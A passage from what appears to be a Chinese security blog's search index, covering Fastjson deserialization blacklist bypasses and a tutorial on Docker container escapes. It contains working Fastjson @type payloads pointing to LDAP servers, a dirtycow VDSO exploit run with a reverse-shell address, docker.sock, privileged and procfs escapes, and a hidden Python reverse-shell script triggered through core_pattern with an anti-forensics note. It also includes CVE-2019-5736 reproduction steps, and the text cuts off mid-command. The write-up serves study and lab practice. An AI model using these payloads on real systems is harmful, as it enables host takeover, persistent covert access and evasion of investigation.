<span class="hljs-number">0</span>).getClass();<br>&#125;<br><br><span class="hljs-keyword">if</span> (className.startsWith(<span class="hljs-string">&quot;L&quot;</span>) &amp;&amp; className.endsWith(<span class="hljs-string">&quot;;&quot;</span>)) &#123;<br>    String newClassName = className.substring(<span class="hljs-number">1</span>, className.length() - <span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">return</span> loadClass(newClassName, classLoader);<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到在黑名单检测之后，当开头有<code>[</code>或者<code>L</code>和<code>;</code>时会去掉这些字符，从而造成了黑名单的绕过</p><p>绕过方式：在包名前加<code>L</code>，包名后加<code>;</code></p><blockquote><p>{“@type”:”<strong>L</strong>com.sun.rowset.JdbcRowSetImpl**;**”,”dataSourceName”:”ldap://vps/Touchfile”,”autoCommit”:true}</p></blockquote><h3 id="1-2-42-开启Autotype"><a href="#1-2-42-开启Autotype" class="headerlink" title="1.2.42(开启Autotype)"></a>1.2.42(开启Autotype)</h3><p>1.2.42修复：假如开头和结尾是<code>L</code>和<code>;</code>就将头和尾去掉，再进行黑名单验证，然后将黑名单加密，不让你们搞了，嘿嘿</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220323014010926.png"></p><p><a href="https://github.com/LeadroyaL/fastjson-blacklist">blacklist-fuzz</a></p><p>双写绕过：</p><blockquote><p><strong>LL</strong>com.sun.rowset.JdbcRowSetImpl**;;**</p></blockquote><h3 id="1-2-43-开启Autotype"><a href="#1-2-43-开启Autotype" class="headerlink" title="1.2.43(开启Autotype)"></a>1.2.43(开启Autotype)</h3><p>开头两个<code>LL</code>抛出异常，迭代就是不断更新黑名单</p><h3 id="1-2-47"><a href="#1-2-47" class="headerlink" title="1.2.47"></a>1.2.47</h3><p>无需开启<code>autotype</code>通杀1.2.48以下所有，有传言在autotype开启的情况下可以打到1.2.57：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br>    <span class="hljs-attr">&quot;a&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;java.lang.Class&quot;</span>, <br>        <span class="hljs-attr">&quot;val&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><br>    &#125;, <br>    <span class="hljs-attr">&quot;b&quot;</span>: &#123;<br>        <span class="hljs-attr">&quot;@type&quot;</span>: <span class="hljs-string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>, <br>        <span class="hljs-attr">&quot;dataSourceName&quot;</span>: <span class="hljs-string">&quot;ldap://localhost:1389/Exploit&quot;</span>, <br>        <span class="hljs-attr">&quot;autoCommit&quot;</span>: <span class="hljs-literal">true</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>断点如下：</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140337580.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140352482.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324140824351.png"></p><p>解析到字段a，步进</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324151509785.png"></p><p>在checkAutoType方法<code>TypeUtils.getClassFromMapping(typeName)</code>以及<code>deserializers.findClass(typeName)</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324160340283.png"></p><p>第一个方法，返回<code>(Class)mappings.get(className)</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324152509308.png"></p><p><code>deserializers.findClass(typeName)</code>在getName获得类名，然后与传入的相比较并返回</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324152757662.png"></p><p>然后还没到<code>autoTypeSupport</code>就return clazz了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324161558201.png"></p><p>调用的反序列化类</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324162612574.png"></p><p>MiscCodec来到304<img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324164412464.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220324164450203.png"></p><p>接着就是第二段的<code>checkAutoType</code>，从mappings拿到<code>com.sun.rowset.JdbcRowSetImpl</code>，同样还没到<code>autoTypeSupport</code>验证拿到的<code>com.sun.rowset.JdbcRowSetImpl</code>就return clazz</p><p>修复将<code>loadClass</code>中的cache设置为false，在第一次获取到<code>com.sun.rowset.JdbcRowSetImpl</code>这个类之后就不会缓存，到第二次的payload时也就取不到缓存的类，也就会进入到黑名单和<code>com.sun.rowset.JdbcRowSetImpl</code>的验证中。</p>]]></content>
    
    
    <categories>
      
      <category>language</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>初探Docker容器逃逸</title>
    <link href="/2022/04/11/%E5%88%9D%E6%8E%A2Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/"/>
    <url>/2022/04/11/%E5%88%9D%E6%8E%A2Docker%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="初探Docker容器逃逸"><a href="#初探Docker容器逃逸" class="headerlink" title="初探Docker容器逃逸"></a>初探Docker容器逃逸</h1><h2 id="判断是否处于Container中"><a href="#判断是否处于Container中" class="headerlink" title="判断是否处于Container中"></a>判断是否处于Container中</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">/.dockerenv文件<br><span class="hljs-regexp">/proc/</span><span class="hljs-number">1</span>/cgroup文件是否存在<span class="hljs-string">&quot;docker&quot;</span>字符串<br>是否有container环境变量<br></code></pre></td></tr></table></figure><h2 id="Container逃逸"><a href="#Container逃逸" class="headerlink" title="Container逃逸"></a>Container逃逸</h2><h3 id="与容器共享存在漏洞的内核"><a href="#与容器共享存在漏洞的内核" class="headerlink" title="与容器共享存在漏洞的内核"></a>与容器共享存在漏洞的内核</h3><p>Dirty  Cow（CVE-2016-5195）是Linux内核中的权限提升漏洞，源于Linux内核的内存子系统在处理写入时拷贝（copy-on-write, Cow）存在竞争条件（race condition），允许恶意用户提权获取其他只读内存映射的写访问权限。竞争条件意为任务执行顺序异常，可能导致应用崩溃或面临攻击者的代码执行威胁。利用该漏洞，攻击者可在其目标系统内提升权限，甚至获得root权限。</p><p>VDSO就是Virtual Dynamic Shared  Object（虚拟动态共享对象），即内核提供的虚拟.so。该.so文件位于内核而非磁盘，程序启动时，内核把包含某.so的内存页映射入其内存空间，对应程序就可作为普通.so使用其中的函数。在容器中利用VDSO内存空间中的“clock_gettime() ”函数可对脏牛漏洞发起攻击，令系统崩溃并获得root权限的shell，且浏览容器之外主机上的文件。</p><p>内核版本低于如下版本，则存在脏牛漏洞。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Centos7</span> /RHEL<span class="hljs-number">7</span>  <span class="hljs-number">3</span>.<span class="hljs-number">10</span>.<span class="hljs-number">0</span>-<span class="hljs-number">327</span>.<span class="hljs-number">36</span>.<span class="hljs-number">3</span>.el<span class="hljs-number">7</span><br><span class="hljs-attribute">Cetnos6</span>/RHEL<span class="hljs-number">6</span>   <span class="hljs-number">2</span>.<span class="hljs-number">6</span>.<span class="hljs-number">32</span>-<span class="hljs-number">642</span>.<span class="hljs-number">6</span>.<span class="hljs-number">2</span>.el<span class="hljs-number">6</span><br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">16</span>.<span class="hljs-number">10</span>    <span class="hljs-number">4</span>.<span class="hljs-number">8</span>.<span class="hljs-number">0</span>-<span class="hljs-number">26</span>.<span class="hljs-number">28</span><br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">16</span>.<span class="hljs-number">04</span>    <span class="hljs-number">4</span>.<span class="hljs-number">4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">45</span>.<span class="hljs-number">66</span><br><span class="hljs-attribute">Ubuntu</span> <span class="hljs-number">14</span>.<span class="hljs-number">04</span>    <span class="hljs-number">3</span>.<span class="hljs-number">13</span>.<span class="hljs-number">0</span>-<span class="hljs-number">100</span>.<span class="hljs-number">147</span><br><span class="hljs-attribute">Debian</span> <span class="hljs-number">8</span>        <span class="hljs-number">3</span>.<span class="hljs-number">16</span>.<span class="hljs-number">36</span>-<span class="hljs-number">1</span>+deb<span class="hljs-number">8</span>u<span class="hljs-number">2</span><br><span class="hljs-attribute">Debian</span> <span class="hljs-number">7</span>        <span class="hljs-number">3</span>.<span class="hljs-number">2</span>.<span class="hljs-number">82</span>-<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><strong>环境：</strong></p><p>宿主机：<a href="http://old-releases.ubuntu.com/releases/14.04.0/ubuntu-14.04.5-server-amd64.iso">Ubuntu 14.04.5</a></p><p>容器：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/gebl/dirtycow-docker-vdso.git<br><span class="hljs-built_in">cd</span> dirtycow-docker-vdso/<br>docker-compose run dirtycow /bin/bash<br><br><span class="hljs-built_in">cd</span> /dirtycow-vdso/<br>make<br>./0xdeadbeef 1.1.1.1:2333 // 反弹shell<br></code></pre></td></tr></table></figure><h3 id="不安全挂载"><a href="#不安全挂载" class="headerlink" title="不安全挂载"></a>不安全挂载</h3><h4 id="挂载docker-sock"><a href="#挂载docker-sock" class="headerlink" title="挂载docker.sock"></a>挂载docker.sock</h4><p><strong><a href="https://blog.csdn.net/boling_cavalry/article/details/92846483">前置知识</a>：</strong></p><p>首先，我们使用过docker的都知道</p><blockquote><p>docker ps  //列出Up容器</p><p>docker images //列出所有的镜像</p></blockquote><p>就这样的命令，牵扯到docker的C/S架构：三个组件(client，daemon，registry)，两个概念(image和container)</p><p>Docker的C/S架构，通信方式有以下3种：</p><ul><li>unix:///var/run/docker.sock(默认)</li><li>tcp://host:port</li><li>fd://socketfd</li></ul><p><img src="https://gimg2.baidu.com/image_search/src=http%3A%2F%2Fseo-1255598498.file.myqcloud.com%2Ffull%2F66ec0965a96e9a6d2d1c191ebcc8807ba71baa93.jpg&refer=http%3A%2F%2Fseo-1255598498.file.myqcloud.com&app=2002&size=f9999,10000&q=a80&n=0&g=0n&fmt=jpeg?sec=1620113819&t=6abc442e6df87436f6b850b78b48ceda"></p><p>我们熟知的Docker命令就是Client；Docker Daemon是Docker架构中一个常驻在后台的系统进程，该守护进程在后台启动了一个Server，该Server负责接受Docker Client发送的请求；并通过路由与分发调度找到相应的Handler来执行请求。</p><p>在Linux系统中，Docker Daemon启动使用的可执行文件也是docker，与Docker Client启动所使用的可执行文件docker相同。在docker命令执行时，通过传入的参数来判别Docker Daemon与Docker Client。</p><p><a href="https://yanbin.blog/replace-docker-desktop-with-hyperkit-minikube/">Docker Desktop收费的那些事</a></p><p>我们更熟悉的CLI模式是怎么工作的呢？</p><p><a href="https://docs.docker.com/engine/reference/commandline/dockerd/#daemon-socket-option">Daemon</a></p><p><a href="https://betterprogramming.pub/about-var-run-docker-sock-3bfd276e12fd">/var/run/docker.sock</a></p><p>那么刚刚两条命令就可以等价于</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json<br>curl -s --unix-socket /var/run/docker.sock http://localhost/images/json<br></code></pre></td></tr></table></figure><p>现在我们就完全明白Docker也是基于C/S架构，其中Daemon会监听/var/run/docker.sock这个文件，我们向这个文件发送合适的请求，可以达到docker命令在终端同样的操作</p><p><a href="https://docs.docker.com/engine/api/">各个版本的API接口</a>：<a href="https://docs.docker.com/engine/api/v1.41/#operation/ContainerList">https://docs.docker.com/engine/api/v1.41/#operation/ContainerList</a></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220408225310174.png"></p><p><strong>环境搭建：</strong></p><blockquote><p>docker pull rocm/dev-ubuntu-18.04  //随便找一个镜像</p><p>docker run -id -v /var/run/docker.sock:/var/run/docker.sock edb  //创建一个挂载了/var/run/docker.sock的容器</p><p>docker exec -it 517 /bin/bash  //进入容器内部</p></blockquote><p>至此，我们已经在实战的一个环境下了</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212210034.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212246397.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409212414544.png"></p><p><strong>攻击步骤：</strong></p><ol><li>在该容器环境下，安装docker</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -fsSL get.docker.com -o get-docker.sh  //官方脚本安装<br>sh get-docker.sh --mirror Aliyun<br></code></pre></td></tr></table></figure><p>安装完docker，因为挂载了/var/run/docker.sock，通过docker命令，我们发现可以列出宿主机的所有docker容器和镜像</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409214204019.png"></p><ol start="2"><li>通过挂载，创建一个新的容器，并挂载宿主机的根目录</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -v /:/a edb /bin/bash  //-id需要<span class="hljs-built_in">exec</span>进入容器<br></code></pre></td></tr></table></figure><ol start="3"><li>在新的容器，更换根目录到挂载的宿主机的根目录</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">chroot /a<br><span class="hljs-comment"># /bin/bash</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409215346242.png"></p><p>至此，基本从容器逃逸出来了</p><h4 id="挂载procfs"><a href="#挂载procfs" class="headerlink" title="挂载procfs"></a>挂载procfs</h4><p>进一步地，我们ps查看进程发现，“逃逸出来的容器“的进程还是容器内的，因为没有挂载procfs</p><blockquote><p>man proc  //查看文档</p></blockquote><p>或者<a href="https://man7.org/linux/man-pages/man5/proc.5.html">Online Manual Pages</a></p><p>procfs是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是没有开启<code>User Namespace</code>时并且在该容器内默认启用root权限</p><p>procfs中的<code>/proc/sys/kernel/core_pattern</code>负责配置进程崩溃时内存转储数据的导出方式</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220409231445112.png"></p><blockquote><p>基于<a href="https://xz.aliyun.com/t/1098">core_pattern用来隐藏系统后门</a>这篇文章，实验如下：</p><ul><li><strong>环境搭建：</strong>创建一个挂载了宿主机/proc目录的容器</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">docker run -it -v /proc:/a/proc edb /bin/bash<br></code></pre></td></tr></table></figure><ul><li><strong>攻击步骤：</strong>在容器内(相当于实战环境下)</li></ul><p>\rcore是写入文件掩盖后门的作用，<code>\r将光标移动至行首，但不换行</code>，cat会遮盖<code>|</code>，vim可以看到端倪</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|/tmp/.conn.py \rcore    &quot;</span> &gt;  /proc/sys/kernel/core_pattern<br></code></pre></td></tr></table></figure><p>然后准备脚本/tmp/.conn.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-keyword">import</span>  os<br><span class="hljs-keyword">import</span> pty<br><span class="hljs-keyword">import</span> socket<br>Rhost = <span class="hljs-string">&quot;ip&quot;</span><br>Rport = port<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>   s.connect((Rhost, Rport))<br>   os.dup2(s.fileno(), <span class="hljs-number">0</span>)<br>   os.dup2(s.fileno(), <span class="hljs-number">1</span>)<br>   os.dup2(s.fileno(), <span class="hljs-number">2</span>)<br>   os.putenv(<span class="hljs-string">&quot;HISTFILE&quot;</span>, <span class="hljs-string">&#x27;/dev/null&#x27;</span>)<br>   pty.spawn(<span class="hljs-string">&quot;/bin/bash&quot;</span>)<br>   <span class="hljs-comment"># os.remove(&#x27;/tmp/.conn.py&#x27;) //实战中防溯源，进一步还可以再恢复/删除掉core_pattern这个文件</span><br>   s.close()<br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>   main()<br></code></pre></td></tr></table></figure><p>因为是脚本运行，需要加执行权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">chmod +x .conny.py<br></code></pre></td></tr></table></figure><p>准备一个可以引起崩溃的c代码</p><p>crash.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">int</span> *a = <span class="hljs-literal">NULL</span>;<br>*a = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gcc crash.c -o crash<br></code></pre></td></tr></table></figure><p>服务器监听，运行crash反弹shell</p></blockquote><p>细心的朋友注意到，原文实验并非基于docker逃逸的，那么我们能否直接写入<code>core_pattern</code>文件进行docker逃逸呢</p><p>注意到写入的<code>/proc/sys/kernel/core_pattern</code>文件是在宿主机的，而<code>/tmp/.conn.py</code>是在容器内的</p><p>所以我们需要获得<code>/tmp/.conn.py</code>在宿主机的绝对路径</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /proc/mounts | grep docker<br></code></pre></td></tr></table></figure><p>其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">workdir=/var/lib/docker/overlay2/17759ecee79fc4ddd2450e20beffc4a2d2e0c785be630d1055bc7e1329660056/work<br></code></pre></td></tr></table></figure><p>那么我们可知，其绝对路径为</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/docker/</span>overlay2<span class="hljs-regexp">/17759ecee79fc4ddd2450e20beffc4a2d2e0c785be630d1055bc7e1329660056/</span>diff<br></code></pre></td></tr></table></figure><p>因此命令改写为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|/var/lib/docker/overlay2/17759ecee79fc4ddd2450e20beffc4a2d2e0c785be630d1055bc7e1329660056/merged/tmp/.conn.py \rcore    &quot;</span> &gt;  /a/proc/sys/kernel/core_pattern<br></code></pre></td></tr></table></figure><p>其他步骤不变即可反弹shell</p><p>进一步优化步骤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">real_path=`sed -n <span class="hljs-string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> -e <span class="hljs-string">&quot;|real_path/tmp/.conn.py \rcore    &quot;</span> &gt;  /proc/sys/kernel/core_pattern<br></code></pre></td></tr></table></figure><h3 id="不安全配置"><a href="#不安全配置" class="headerlink" title="不安全配置"></a>不安全配置</h3><h4 id="docker-remote-api"><a href="#docker-remote-api" class="headerlink" title="docker remote api"></a>docker remote api</h4><p><strong>检测方式：</strong></p><blockquote><p>直接访问 ip:2375/version ip:2375/containers/json等</p><p>docker -H tcp://ip:2375 ps #返回了容器列表则漏洞存在</p></blockquote><p><strong>利用方式：</strong></p><p>可以参考不安全挂载，反弹shell(逃逸出来后写计划任务反弹shell、写ssh公钥)</p><p>利用脚本：<a href="https://github.com/Tycx2ry/docker_api_vul">https://github.com/Tycx2ry/docker_api_vul</a></p><h4 id="privilege容器逃逸"><a href="#privilege容器逃逸" class="headerlink" title="privilege容器逃逸"></a>privilege容器逃逸</h4><p>当操作者执行<code>docker run --privileged</code>时，Docker将允许容器访问宿主机上的所有设备，同时修改AppArmor或SELinux的配置，使容器拥有与那些直接运行在宿主机上的进程几乎相同的访问权限</p><p><strong>特权容器判断：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">cat /proc/1/status | grep Cap<br></code></pre></td></tr></table></figure><p>存在值<code>0000003fffffffff</code>即为特权容器</p><blockquote><p>–privileged所指的特权容器并不等于Capabilities加满，事实上，前者是包含后者的。具体来说，–privileged至少包含以下能力：</p><ol><li>Capabilities加满</li><li>禁用Seccomp和AppArmor等安全机制</li><li>能够“看到”很多敏感的dev设备</li></ol><p>linux的Capabilities机制<br><a href="https://man7.org/linux/man-pages/man7/capabilities.7.html">https://man7.org/linux/man-pages/man7/capabilities.7.html</a><br>它对用户的权限进行了更细致的分类，可以对单个线程进行更精度的权限控制。避免粗暴的root特权用户和常规用户的简单区分。当一个进程要进行某个特权操作时,操作系统会检查cap_effective的对应位是否有效,而不再是检查进程的有效UID是否为0。</p><p>一个线程拥有五个Capabilities集合<code>Permitted</code>、<code>Inheritable</code>、<code>Effective</code>、<code>Bounding</code>和<code>Ambient</code><br>分别对应了<code>/proc/self/status</code>中的<code>CapPrm</code>、<code>CapInh</code>、<code>CapEff</code>、<code>CapBnd</code>和<code>CapAmb</code><br><code>Effective</code>集合就是主要的当前线程特权操作权限（Capabilities）的集合。</p></blockquote><p><strong>环境：</strong></p><p>以特权模式启动的容器，<code>fdisk -l</code></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220410221555377.png"></p><p>现在相当于完成了<strong>挂载docker.sock</strong>中的第二步，启动了一个挂载了根目录的容器</p><p><strong>攻击步骤：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkdir /a<br>mount /dev/vda1 /a<br>chroot /a<br><span class="hljs-comment"># /bin/bash</span><br></code></pre></td></tr></table></figure><p>逃逸完成</p><h2 id="CVE-2019-5736"><a href="#CVE-2019-5736" class="headerlink" title="CVE-2019-5736"></a>CVE-2019-5736</h2><p><a href="https://cloud.tencent.com/developer/article/1552332">https://cloud.tencent.com/developer/article/1552332</a></p><p>在docker的组件中，runc是一个标准的OCI容器运行时的实现，它是一个命令行工具，通过调用Namespace、Cgroup等系统接口，负责真正意义上创建和启动容器。换句话说，docker客户端就是通过调用runc来创建销毁机器的。</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"># yanq @ yanq-desk in ~ [16:28:01] <br>$ docker info | grep &quot;runc&quot;                    <br><span class="hljs-code"> Runtimes: runc</span><br><span class="hljs-code"> Default Runtime: runc</span><br><span class="hljs-code"> runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd</span><br><span class="hljs-symbol">WARNING: </span>No swap limit support<br></code></pre></td></tr></table></figure><p><strong>影响版本：</strong></p><ul><li>Docker Version &lt; 18.09.2</li><li>runC Version &lt;= 1.0-rc6</li></ul><p><strong>漏洞原理：</strong></p><p>漏洞总结下来就是一句话，攻击者可以重写宿主机上的runc二进制文件。</p><p>先来看<code>/proc/self/exe</code>是什么？</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle">$ <span class="hljs-keyword">file</span> <span class="hljs-regexp">/proc/</span>self/exe<br><span class="hljs-regexp">/proc/</span>self<span class="hljs-regexp">/exe: symbolic link to /u</span>sr<span class="hljs-regexp">/bin/</span><span class="hljs-keyword">file</span><br></code></pre></td></tr></table></figure><p>proc/self/exe符号链接会指向调用者自身，同理proc/pid/exe会指向pid进程的调用者。但是/proc/pid/exe和一般符号链接不同，其不遵循符号链接的正常语义，当进程打开/proc/pid/exe时，没有正常的读取和跟踪符号链接内容的过程。相反，内核只是让用户直接访问打开的文件条目。</p><p>漏洞产生的原因就是宿主机通过runc对docker容器进行操作的时候没有做好访问限制，导致runc可以通过/proc/self/exe符号链接来访问到宿主机上的runc文件。攻击者可以让runc运行/proc/self/exe符号链接来欺骗它自己执行自己，从而对宿主机上的runc文件进行覆盖重写。</p><p>具体的利用步骤：</p><ol><li>容器内生成一个恶意文件，将文件的调用者改为proc/self/exe</li><li>宿主机docker exec调用该恶意文件，会调用proc/self/exe，也就是runc，此时容器内便可以遍历proc进程号，获取runc的进程号</li><li>得到容器进称号PID后，可以获取/proc/pid/exe文件描述符fd</li><li>对fd进行写操作，覆盖原有runc的文件</li></ol><p>问题1：攻击者为什么不继续写入恶意文件从而覆盖主机上的runc二进制文件？</p><p>因为内核将不允许在执行runC时将其覆盖。于是可以通过获取/proc/PID/exe的file handler 来获取runcinit的文件描述符。 然后再写入该文件。</p><p>问题2：runc创建容器时,会首先创建新进程runc-init，并且runc-init在另一个namespace里面，用来做隔离，那么为什么不覆盖runc的子进程runC init？</p><p>CVE-2016-9962漏洞修补程序在进入容器之前就将runC init进程设置为“不可转储”（Non-dumpable）。其漏洞原理是runC init进程拥有来自宿主机的打开文件描述符，容器中的攻击者可以利用它来遍历主机的文件系统，从而打开容器。</p><p><strong>漏洞复现：</strong></p><p>首先安装带有漏洞版本的docker，我直接使用的是ubuntu16，版本为18.06.1-ce。</p><p>如果你没有安装docker或者docker版本没有漏洞,则需要重新安装docker的漏洞版本,步骤如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo apt-get remove docker docker-engine docker.io containerd runc<br>sudo apt-get update<br>sudo apt-get install apt-transport-https ca-certificates curl gnupg-agent software-properties-common<br>curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add -<br>sudo add-apt-repository <span class="hljs-string">&quot;deb [arch=arm64] https://download.docker.com/linux/ubuntu <span class="hljs-subst">$(lsb_release -cs)</span> stable&quot;</span><br>sudo apt-cache madison docker-ce<br><br><span class="hljs-comment"># 下面选择一个docker-ce版本进行安装</span><br>sudo apt-get install docker-ce=&lt;version&gt;<br></code></pre></td></tr></table></figure><p>下面利用<a href="https://github.com/Frichetten/CVE-2019-5736-PoC/%E6%9D%A5%E5%A4%8D%E7%8E%B0">https://github.com/Frichetten/CVE-2019-5736-PoC/来复现</a></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># 1 编译好main.go，此步骤略</span><br><br><span class="hljs-comment"># 2 备份runc或者docker-runc!!!</span><br>cp <span class="hljs-regexp">/usr/</span>bin<span class="hljs-regexp">/docker-runc /u</span>sr<span 